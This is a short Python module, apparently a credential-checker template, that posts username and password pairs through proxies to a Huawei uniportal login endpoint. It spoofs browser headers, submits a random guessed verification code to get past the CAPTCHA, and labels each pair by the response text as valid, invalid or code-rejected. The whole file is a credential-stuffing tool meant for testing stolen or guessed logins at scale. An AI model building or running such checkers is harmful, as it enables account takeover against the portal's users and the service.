"""

AUTHOR: ExtremeDev
INSTAGRAM: @extremedevalt
Date: 17/03/2020

"""

import requests, random

class Start:
    def check(username: str=None, password: str=None, proxy: dict=None):
        def returning(code=None):
            if code is None: code = 5
            return {"{}:{}".format(str(username), str(password)):code}
        try:
            sess = requests.Session()
            sess.proxies = proxy

            payload = {
                'actionFlag': 'loginAuthenticate',
                'deviceFingerInfo': '',
                'uid': username,
                'password': password,
                'verifyCode': random.choice(range(1009,9999)),
                'loginFlag': 'byUid'
            }

            sess.headers = {
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding":"gzip,deflate,br",
                "Accept-Language":"en-US,en;q=0.9",
                "Cache-Control":"max-age=0",
                "Connection":"keep-alive",
                "Content-Length":"276",
                "Content-Type":"application/x-www-form-urlencoded",
                "Host":"uniportal.huawei.com",
                "Origin":"https",
                "Referer":"https",
                "sec-ch-ua":"\"Not;ABrand\";v=\"99\",\"GoogleChrome\";v=\"91\",\"Chromium\";v=\"91\"",
                "sec-ch-ua-mobile":"?0",
                "Sec-Fetch-Dest":"document",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-User":"?1",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0(X11;Linuxx86_64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/91.0.4472.114Safari/537.36"
            }


            r = sess.post('https://localhost/loginDo', data=payload)
            del sess, payload
            if 'RIGHT RESPONSE'in r.text:
                return returning(0)
            elif 'BAD RESPONSE' in r.text:
                return returning(1)
            elif 'INVALID CODE' in r.text:
                return returning(2)
            else:
                return returning(3)
        except:
            return returning(4)